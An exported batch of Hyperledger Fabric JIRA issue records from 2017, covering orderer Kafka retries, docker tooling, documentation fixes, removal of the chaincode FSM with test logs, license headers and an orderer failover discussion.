[https://hyperledger-fabric.readthedocs.io/en/release/build_network.html], install all the [Prerequisites|https://hyperledger-fabric.readthedocs.io/en/release/prereqs.html] , get samples from [Hyperledger Fabric Samples|https://hyperledger-fabric.readthedocs.io/en/release/samples.html], 

cd first-netwrok, 

execute ./byfn.sh -m generate commend, it's good

then execute ./byfn.sh -m up, error occurs: 

Shimingbookmini:first-network Shiming$ ./byfn.sh -m up

Starting with channel 'mychannel' and CLI timeout of '10' seconds and CLI delay of '3' seconds

Continue (y/n)? y

proceeding ...

Pulling orderer.example.com (hyperledger/fabric-orderer:latest)...

ERROR: manifest for hyperledger/fabric-orderer:latest not found

ERROR !!!! Unable to start network

Error response from daemon: No such container: cli

Shimingbookmini:first-network Shiming$

 

I noticed that you gave a link which is 1.1.0 alpha binaries, but what I installed is 1.0.5 binaries from here [https://hyperledger-fabric.readthedocs.io/en/release/samples.html#binaries,] is this the problem?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Kafka retry process should do an initial operation before waiting for time tick,FAB-5413,19403,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,guoger,guoger,guoger,21/Jul/17 4:31 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Jul/17 10:17 PM,v1.0.0,,,v1.0.1,,fabric-orderer,,,,,,0,,,,,,,"in https://github.com/hyperledger/fabric/blob/release/orderer/kafka/retry.go#L46 first operation will be executed when time ticker fires, which causes a delay for every initial operation. These delay are accumulated in `startThread`, which causes slow start of kafka-based chain. We should use `do...while`  semantics here, instead of `while...do`, as currently implemented.",,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9bz:",,,,,,,,,,,,,,,,,,,,,,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Jul/17 4:49 PM;guoger;https://gerrit.hyperledger.org/r/#/c/11797/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Modify fabric-tools image,FAB-5414,19405,18848,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,qiang0723,qiang0723,qiang0723,21/Jul/17 5:45 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Jul/17 6:27 PM,,,,,,,,,,,,0,SDK-Python,,,,,,Get fabric-tool image from official registry,,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9c7:",,,,,,,,,,,,,,,,,,,,,,,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Jul/17 6:13 PM;qiang0723;https://gerrit.hyperledger.org/r/#/c/11805/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
configtxlator bad command input common.Configuration should be common.Config,FAB-5416,19412,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,rickr,rickr,22/Jul/17 12:20 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jul/17 1:27 AM,v1.0.0,v1.0.1,,v1.1.0,,fabric-docs,,,,,,0,,,,,,,"[http://hyperledger-fabric.readthedocs.io/en/master/configtxlator.html]

[~jyellick]",,jyellick,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9cv:",,,,,,,,,,,,,,,,,,,,,,,jyellick,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jul/17 11:38 AM;jyellick;This is not a critical bug fix, I do not see this as a candidate for v1.0.1, moving to v1.1.;;;","25/Jul/17 11:44 AM;jyellick;In review via: https://gerrit.hyperledger.org/r/#/c/11891/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Add ""ci-check"" target in fabric Makefile",FAB-5417,19413,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,rameshthoomu,rameshthoomu,22/Jul/17 12:34 AM,20/Jul/18 11:17 PM,28/Oct/23 3:00 AM,20/Jul/18 11:06 PM,v1.0.0,,,DUPLICATE,,fabric-build,,,,,,0,,,,,,,"Add ""ci-check"" target in fabric Makefile to test all",,ChristopherFerris,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3hz:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jul/17 10:22 PM;rameshthoomu;ci-check has to trigger **linter**, **license**, **unit-tests**;;;","07/Apr/18 8:44 AM;ChristopherFerris;[~rameshthoomu] is this still relevant? If not, let's mark it Invalid. Thanks.;;;","09/May/18 9:37 PM;ChristopherFerris;closing this as duplicate of enable_ci_only_tests. reopen if still relevant;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
npm install requires additional documentation on Windows,FAB-5418,19417,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,lehors,lehors,lehors,22/Jul/17 2:45 AM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,25/Jul/17 11:24 PM,v1.0.0,,,v1.0.1,,fabric-docs,,,,,,0,,,,,,,"Because the fabcar sample npm install builds native modules to succeed on Window one needs to install all the required Visual C++ Build Tools.

This can easily be achieved with the command:

{{npm install --global windows-build-tools}}

But this should be added to the prerequisites.

 

 ",,lehors,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9db:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,lehors,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jul/17 12:25 AM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11821;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
End to End sample for Java SDK,FAB-5419,19418,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,venu.vemula,venu.vemula,venu.vemula,22/Jul/17 3:08 AM,23/Jan/20 6:55 AM,28/Oct/23 3:00 AM,23/Jan/20 6:55 AM,,,,,,fabric-samples,,,,,,0,stale-item,,,,,,"This issue is created to upload a end to end application for Java SDK for Hyperledger Fabric 1.0 .. using maven JAVA SDK libraries.

The app directly uses SDK jar from maven repository.",,rickr,sykesm,venu.vemula,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9dj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,rickr,sykesm,venu.vemula,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jul/17 4:44 AM;rickr;Samples I think should belong to [https://gerrit.hyperledger.org/r/#/admin/projects/fabric-samples] project;;;","23/Jan/20 6:55 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CouchDB docker image config improvements,FAB-5420,19419,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,chris.elder,chris.elder,chris.elder,22/Jul/17 3:14 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,15/May/18 6:29 AM,,,,v1.1.0,,fabric-ledger,,,,,,0,,,,,,,"Currently, the local.ini is placed in the /etc/local.d directory.

This file should be in the /etc directory based on the documentation:

[http://docs.couchdb.org/en/2.0.0/config/intro.html]

Also, the couchdb username and password are currently placed in /etc/local.d/docker.ini.  When couchdb is started, the password is hashed and stored in the /etc/local.ini.   The password in the docker.ini is left in clear text.  

Writing the username and password to the /etc/local.ini will prevent passwords being left in clear text.

 ",,chris.elder,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9dr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,chris.elder,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/May/18 6:28 AM;denyeart;https://gerrit.hyperledger.org/r/#/c/11825/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add configtxlator to fabric-tools docker image,FAB-5421,19420,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rickr,rickr,rickr,22/Jul/17 4:48 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Jul/17 7:33 PM,v1.0.1,,,v1.0.1,,fabric-build,,,,,,0,,,,,,,,,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9dz:",,,,,,,,,,,,,,,,,,,,,,,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
need clearer and more prominent pointer to get answers to Qs,FAB-5422,19421,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,22/Jul/17 4:59 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,24/Jul/17 10:15 PM,v1.0.0,,,v1.0.1,v1.1.0,fabric-docs,,,,,,0,,,,,,,"we need to raise the prominence of the ""Still Have Questions?"" page and make clearer where people can and should go.",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9e7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jul/17 5:16 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/11829;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
remove FSM from chaincode,FAB-5424,19423,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,22/Jul/17 6:11 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,13/Mar/18 5:55 PM,,,,v1.2.0,,fabric-peer,,,,,,0,,,,,,,"FSM was needed to serialize invokes in 0.5/0.6. In 1.0 invokes can be concurrent and the FSM can be removed entirely.

This will help
* simplify chaincode
* cleanup
* make it easier to implement other language  such as node based chaincode (see FAB-2331)
",,baohua,jeffgarratt,mastersingh24,muralisr,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABCN-8,FAB-7959,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzx7h3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,jeffgarratt,mastersingh24,muralisr,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Nov/17 11:14 AM;baohua;Sorry not get the problem.

IMHO, there's FSM for each chaincode now? Why FSM will block concurrent cc invocation?

Pls correct me if i'm wrong, thanks!;;;","09/Dec/17 6:34 PM;mastersingh24;[https://gerrit.hyperledger.org/r/11867] 

[~muralisr] - are we going to do this for v1.1?;;;","09/Dec/17 11:10 PM;muralisr;[~mastersingh24] I'll take care of this over this weekend. May be easier to abandon [~raidinesh80] changes and start over. Let me assign this to myself.

([~raidinesh80] I'll try a rebase first to preserve history).;;;","23/Dec/17 7:24 PM;mastersingh24;[~muralisr]  - The more I look at this and given we've let this hang out there for a long time, IMHO we should push this to the next release in order to reduce risk at this point.  If we get this in early in the cycle for the next release, we can start really testing it by having people use it for a decent period of time;;;","23/Dec/17 10:23 PM;muralisr;[~mastersingh24] the risk of pushing it to next release is it'll get harder to remove the FSM. 

How about this, I'll also test with Java shim which still has the FSM. If it works as expected that's actually an important datapoint - a fabric without FSM working with old chaincode with FSM shows complete parity. 

Also note that its all internal (and is just 4 chaincode files) propose we let this in and revert if this gets hard. I don't think this at all risky in that sense.;;;","24/Dec/17 12:41 AM;muralisr;Testing with Java chaincode verifies that chaincodes side remain unaffected by the FSM removal (peer does not have FSM, Java Chaincode has FSM). Since this validates peer side and the new peer side works with the new chaincode side, by extension it validates the chaincode side too.

 

Install Java CC
{code:java}
CORE_PEER_ADDRESS=10.0.0.35:7051 peer chaincode install -p /Users/muralisr/hyperledger/src/github.com/hyperledger/fabric/examples/chaincode/java/chaincode_example02 -n mycc -v 0 -l java
2017-12-23 10:34:28.591 EST [chaincodeCmd] checkChaincodeCmdParams -> INFO 001 Using default escc
2017-12-23 10:34:28.591 EST [chaincodeCmd] checkChaincodeCmdParams -> INFO 002 Using default vscc
2017-12-23 10:34:28.596 EST [container] WriteFolderToTarPackage -> INFO 003 rootDirectory = /Users/muralisr/hyperledger/src/github.com/hyperledger/fabric/examples/chaincode/java/chaincode_example02
2017-12-23 10:34:28.600 EST [main] main -> INFO 004 Exiting..{code}
Instantiate Java cc
{code:java}
CORE_PEER_ADDRESS=10.0.0.35:7051 peer chaincode instantiate -n mycc -l java -v 0 -c '{""Args"": [""init"", ""a"",""100"",""b"",""200""]}' -C myc
2017-12-23 10:34:52.251 EST [chaincodeCmd] InitCmdFactory -> INFO 001 Get chain(myc) orderer endpoint: 127.0.0.1:7050
2017-12-23 10:34:52.253 EST [chaincodeCmd] checkChaincodeCmdParams -> INFO 002 Using default escc
2017-12-23 10:34:52.253 EST [chaincodeCmd] checkChaincodeCmdParams -> INFO 003 Using default vscc
2017-12-23 10:34:53.404 EST [main] main -> INFO 004 Exiting.....{code}
 

Invoke Java CC
{code:java}
CORE_PEER_ADDRESS=10.0.0.35:7051 peer chaincode invoke -n mycc -c '{""Args"": [""invoke"",""a"",""b"",""10""]}' -C myc
2017-12-23 10:35:11.606 EST [chaincodeCmd] InitCmdFactory -> INFO 001 Get chain(myc) orderer endpoint: 127.0.0.1:7050
2017-12-23 10:35:11.606 EST [chaincodeCmd] checkChaincodeCmdParams -> INFO 002 Using default escc
2017-12-23 10:35:11.606 EST [chaincodeCmd] checkChaincodeCmdParams -> INFO 003 Using default vscc
2017-12-23 10:35:11.644 EST [chaincodeCmd] chaincodeInvokeOrQuery -> INFO 004 Chaincode invoke successful. result: status:200 message:""Successfully transferred 10 assets from a to b.""
2017-12-23 10:35:11.644 EST [main] main -> INFO 005 Exiting.....{code}
 

Query Java CC
{code:java}
CORE_PEER_ADDRESS=10.0.0.35:7051 peer chaincode query -n mycc -c '{""Args"": [""query"",""a""]}' -C myc
2017-12-23 10:35:20.811 EST [chaincodeCmd] checkChaincodeCmdParams -> INFO 001 Using default escc
2017-12-23 10:35:20.811 EST [chaincodeCmd] checkChaincodeCmdParams -> INFO 002 Using default vscc
Query Result: {""Name"":""a"",""Amount"":90}
2017-12-23 10:35:20.848 EST [main] main -> INFO 003 Exiting.....{code}
 

Kill the CC container

 
{code:java}
docker ps
CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
1daeabd58e25 dev-jdoe-mycc-0-0fd54dfd58ee0d04b3ecec52734d75071ef4f2abe122656c5c66e51f28f65ce4 ""java -jar chainco..."" 32 seconds ago Up 31 seconds dev-jdoe-mycc-0
docker rm -f 1daeabd58e25
1daeabd58e25
{code}
 

 

Send another query

 
{code:java}
CORE_PEER_ADDRESS=10.0.0.35:7051 peer chaincode query -n mycc -c '{""Args"": [""query"",""a""]}' -C myc
2017-12-23 10:35:50.608 EST [chaincodeCmd] checkChaincodeCmdParams -> INFO 001 Using default escc
2017-12-23 10:35:50.608 EST [chaincodeCmd] checkChaincodeCmdParams -> INFO 002 Using default vscc
Query Result: {""Name"":""a"",""Amount"":90}
2017-12-23 10:35:51.813 EST [main] main -> INFO 003 Exiting.....
docker ps
CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
a561bc717b54 dev-jdoe-mycc-0-0fd54dfd58ee0d04b3ecec52734d75071ef4f2abe122656c5c66e51f28f65ce4 ""java -jar chainco..."" 4 seconds ago Up 4 seconds dev-jdoe-mycc-0
{code}
 ;;;","24/Dec/17 12:42 AM;muralisr;CChecker stress tests

 
{code:java}
./ccchecker (50)
 Time for invokes(ms): 4277
 Num successful invokes: 5000(5000)
 Num successful queries: 5000(5000)
Test complete
./ccchecker (100)
 Time for invokes(ms): 7982
 Num successful invokes: 10000(10000)
 Num successful queries: 10000(10000)
Test complete
{code}
 ;;;","05/Jan/18 5:51 AM;jeffgarratt;[~muralisr] [~mastersingh24]

I am concerned about the reasoning for removing the FSM(s) in general.  They were created to allow for simple comprehension of the state transitions and the messages triggering them, and subsequent cancellation/continuation.  I have looked at [https://gerrit.hyperledger.org/r/#/c/11867/] and it appears that the once declarative form of transitions is now embedded throughout the code, making it much less discernible and comprehensible.  A trade-off was made in the initial design of verbosity for the sake comprehensibility, and traceability between the chaincode and its shim counterpart (FSM).  I do not understand how the concept of re-entry would preclude the use of the existing FSM, but would rather simply reduce the transitions.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Replace gossip license headers with SPDX license headers,FAB-5425,19424,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,22/Jul/17 6:23 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jul/17 4:14 AM,v1.0.0,,,v1.1.0,,fabric-gossip,,,,,,0,,,,,,,"Fabric has some code that has:
{quote}/*
Copyright IBM Corp. 2016 All Rights Reserved.
Licensed under the Apache License, Version 2.0 (the ""License"");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at
		 http://www.apache.org/licenses/LICENSE-2.0
Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an ""AS IS"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/{quote}

We need to replace it to the new SPDX license: 

{quote}/*
Copyright IBM Corp. All Rights Reserved.

SPDX-License-Identifier: Apache-2.0
*/{quote}
",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9en:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peers do not seem to switch properly when orderer is stopped.,FAB-5429,19429,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jkirke,ptippett,ptippett,23/Jul/17 3:49 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Sep/17 3:11 AM,,,,,,fabric-peer,,,,,,0,HSBN,,,,,,"The peers should switch to another orderer when the orderer is stopped. That does not seem to be happening in our environment.

Abstract: I am performing testing to ensure that I am still able to perform channel create, channel join, install / instantiate chaincode, invokes, and queries when one of our 3 orderers is stopped.

Details: I am successfully executing invokes on my two peers: fabric-peer-org1-15999a and fabric-peer-org1-15999c. I am then stopping fabric-orderer-18193b (I have two other orderers: fabric-orderer-18193a and fabric-orderer-18193c). Once fabric-orderer-18193b is stopped I cannot successfully complete any invokes to either peer.

SDK.txt lists is the sdk output during this problem.

You should be able to reproduce this by having 2 orderers and a peer that is being sent continuous transactions via the SDK, if you stop the orderer the peer is using, transactions will stop and the peer will not fail over to the other orderer.

I've attached logs but noticed he peer logs didn't successfully upload.  I've asked the person who found this to reattach the peer logs.",,C0rWin,denyeart,harsha544,jkirke,jyellick,kchristidis,mastersingh24,muralisr,ptippett,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jul/17 9:15 AM;jkirke;d0570fc3fd6645c78b2ef794965e1971_Logs-1.zip;https://jira.hyperledger.org/secure/attachment/11748/d0570fc3fd6645c78b2ef794965e1971_Logs-1.zip","25/Jul/17 10:23 AM;jkirke;fabric-orderer-22240a_configtx.yaml;https://jira.hyperledger.org/secure/attachment/11767/fabric-orderer-22240a_configtx.yaml","25/Jul/17 10:23 AM;jkirke;fabric-orderer-22240a_orderer.yaml;https://jira.hyperledger.org/secure/attachment/11769/fabric-orderer-22240a_orderer.yaml","25/Jul/17 10:23 AM;jkirke;fabric-orderer-22240c_configtx.yaml;https://jira.hyperledger.org/secure/attachment/11766/fabric-orderer-22240c_configtx.yaml","25/Jul/17 10:23 AM;jkirke;fabric-orderer-22240c_orderer.yaml;https://jira.hyperledger.org/secure/attachment/11768/fabric-orderer-22240c_orderer.yaml","23/Jul/17 3:49 AM;ptippett;peer_failover.zip;https://jira.hyperledger.org/secure/attachment/11744/peer_failover.zip",,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9fj:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,denyeart,harsha544,jkirke,jyellick,kchristidis,mastersingh24,muralisr,ptippett,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jul/17 7:17 AM;kchristidis;Paul, thanks for submitting this.

A couple of observations:

In our internal thread, [~jkirke] wrote:
{quote}In the example I gave, my invokes follow either the peer A / orderer A path or the peer C / orderer C path but stopping orderer B caused a complete inability to perform invokes on either orderer A or orderer C.
{quote}
This contradicts the description here:
{quote}if you stop the orderer the peer is using, transactions will stop and the peer will not fail over to the other orderer.
{quote}
So, let's clarify first which one is it.

Furthermore, based on the description, the issue is easily reproducible.

[~jkirke]: Can you please perform the following experiment, then attach the corresponding logs:
 # Set the logging to DEBUG level for both peer and orderer.
 # Recreate the problem in the shortest amount of steps possible. (I'd assume that would be ""invoke once successfully, stop orderer, invoke again unsuccessfully, STOP"")

In the logs that I see, the logs are not set to DEBUG level, and there is more noise than there should be. For instance, I see an orderer being restarted 5 times.

--

As best as I can tell, and as I also stated in the internal thread, this does not seem to be an issue with the orderer. (If Jason's version of events is accurate – see request for clarification above –, the stopped orderer doesn't participate in ordering in any way, so its failure is irrelevant to the process. If Paul's version of events is accurate we should look into why the peer is not performing a failover.)

I am therefore un-assigning myself from this, but I'll gladly look into it if in the end it turns out to be an orderer bug.;;;","24/Jul/17 1:00 AM;jkirke;{quote}In the example I gave, my invokes follow either the peer A / orderer A path or the peer C / orderer C path but stopping orderer B caused a complete inability to perform invokes on either orderer A or orderer C.
{quote}
{quote}if you stop the orderer the peer is using, transactions will stop and the peer will not fail over to the other orderer.
{quote}
These statements are not contradictory. No fail over occurs in any case. In addition to no fail over occurring, taking down an orderer that is not being directly called (orderer b) in my example can prevent executions even thought the other two orderers are availablie.

 ;;;","24/Jul/17 1:01 AM;Clayton Sims;Based on text exchange with Kostis yesterday....moving to Murali.;;;","24/Jul/17 2:14 AM;Clayton Sims;Sunday checkpoint call:  Paul to work with team to provide requested logs;;;","24/Jul/17 5:11 AM;kchristidis;{quote}These statements are not contradictory. No fail over occurs in any case.
{quote}
You're saying that you kill an orderer that no peer is using (you do peer A / orderer A and peer C / orderer C and you kill orderer B), while Paul says ""kill an orderer that the peer is using"". -How is this not contradictory?- Perhaps contradictory is the wrong word. Is ""quite different"" better?

Also, in your case, why would there be a need for a failover to begin with? Nobody is using that orderer.;;;","24/Jul/17 9:14 AM;jkirke;Understood. Perhaps there are two issues really then because: 1. fail over does not work and 2. sometimes stopping a single orderer prevents any orders from working.

Will enabled DEBUG logging and tried this out this afternoon. According to him he stopped orderer C and saw the failure. Here are the logs he sent added as an attachment.;;;","24/Jul/17 9:37 PM;mastersingh24;Are we sure that the peers know about the other orderer endpoints?;;;","25/Jul/17 5:30 AM;jkirke;I am not confident that the way the SDK uses our peers and orderers facilitates fail over. I am honestly more concerned with issue 2. (sometimes stopping a single orderer prevents any orders from working). In this case it is impossible to perform any invokes until all the orderers and peers are restarted.

For issue 1, fail over does not work, if we are specifying a single orderer using the SDK and that orderer is down is there anything that would allow for fail over? ;;;","25/Jul/17 6:43 AM;muralisr;Assumptions
 * peer is configured to multiple orderers A, B and C
 * SDK is sending transactions to an orderer which is NOT killed (just to eliminate any app errors)
 * killed one of the other orderers

Expect peer to switch to one of the other running orderers and pick up.

If that's not happening first place to look at is deliveryservice ... [~C0rWin] can you take a look at this please ?

[~jkirke] [~ptippett] Can you verify the above assumptions ?;;;","25/Jul/17 7:07 AM;kchristidis;{quote}I am not confident that the way the SDK uses our peers and orderers facilitates fail over. I am honestly more concerned with issue 2. (sometimes stopping a single orderer prevents any orders from working). In this case it is impossible to perform any invokes until all the orderers and peers are restarted.

For issue 1, fail over does not work, if we are specifying a single orderer using the SDK and that orderer is down is there anything that would allow for fail over? 
{quote}
This is not helping. Let's please identify _the single issue_ that we wish to address with this JIRA.;;;","25/Jul/17 7:39 AM;jkirke;I think it is helping since I am attempting to make sure we are using this issue for the issue I reported. The focus should be on the issue where stopping a single orderer prevents all invokes from running on any orderer.

I cannot locate Kostas or Murali on Rocket or Slack to discuss the issue to avoid churn on this issue. Please contact me on either to discuss.;;;","25/Jul/17 7:55 AM;muralisr;[~jkirke] can you verify the assumptions in my previous comment are correct ?;;;","25/Jul/17 8:38 AM;jkirke;I talked with Murali on the phone and will gather the configuration information he has requested.

 ;;;","25/Jul/17 10:23 AM;jkirke;Here are the configtx.yaml and orderer.yaml files from orderer A and orderer C. Orderer B is off and is has caused invokes to not function on my peer C currently. It also has caused the ledger values for peer A and C to not agree so I do not want to restart it since I am hoping you can meet me tomorrow to look at the issue.;;;","25/Jul/17 10:51 AM;Clayton Sims;Artem - this is an HSBN defect and we want to have all defects included  for 7/26 cutoff for v1.0.1.   I would like to ask you to prioritize this to include into v1.0.1. ;;;","25/Jul/17 11:14 AM;jyellick;I see one significant problem immediately based off the files you have uploaded.

Bootstrapping the ordering network must be done **once** and once only. Running {{configtxgen}} multiple times to generate multiple orderer genesis blocks will almost always produce different blocks at each invocation.

I also see in the {{orderer.yaml}} that the {{provisional}} genesis method is specified. This should *never* be used in a production environment, as it causes the genesis block to be dynamically generated (which again, will usually be different at each invocation).

Essentially, what I believe you have done is start three disparate blockchains which were forked at genesis. When a failure occurs, there is no way for the peer to failover, because all blocks from other orderers will not chain with the peer's existing chain.;;;","25/Jul/17 11:44 AM;muralisr;[~jkirke] lets take a step back and walk through the configuration and setup tomorrow ? 

